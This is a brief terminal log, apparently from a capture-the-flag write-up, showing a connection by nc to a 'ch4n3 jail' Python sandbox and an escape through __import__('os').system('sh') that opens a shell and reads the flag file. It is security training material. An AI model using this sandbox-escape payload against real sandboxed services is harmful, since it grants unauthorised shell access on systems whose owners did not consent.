@@ -1,0 +1,12 @@
+C:\Users\Safflower>nc 198.13.62.9 9989
+####################
+#### ch4n3 jail ####
+####################
+>>> __import__("os").system("sh")
+ls
+flag
+pyjail.py
+run.sh
+cat flag
+FLAG{You already know python jail escaping}
+^C
